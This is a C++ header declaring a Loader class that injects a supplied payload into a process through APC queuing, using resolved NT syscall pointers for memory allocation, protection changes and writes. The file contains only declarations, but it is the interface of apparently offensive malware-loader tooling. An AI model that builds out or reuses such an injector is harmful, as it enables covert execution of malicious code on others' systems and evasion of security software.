#pragma once

#include <Windows.h>
#include "Structs.h"
#include "Resolver.h"

class Loader {
private:
	typedef struct _Syscall {
		fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory;
		fnNtProtectVirtualMemory	pNtProtectVirtualMemory;
		fnNtWriteVirtualMemory		pNtWriteVirtualMemory;
		fnNtQueueApcThread			pNtQueueApcThread;
	} Syscall, *PSyscall;

	Syscall St = { 0 };
	NTSTATUS STATUS = NULL;
	PVOID pAddress = NULL;
	ULONG uOldProtection = NULL;
	SIZE_T sSize = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;

	Resolver resolver;

	BOOL InitSyscallStruct(OUT PSyscall St);

	BOOL ApcInjection(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize);

public:
	Loader();
	int RunApcInjection(IN PVOID pPayload, IN SIZE_T sPayloadSize);
};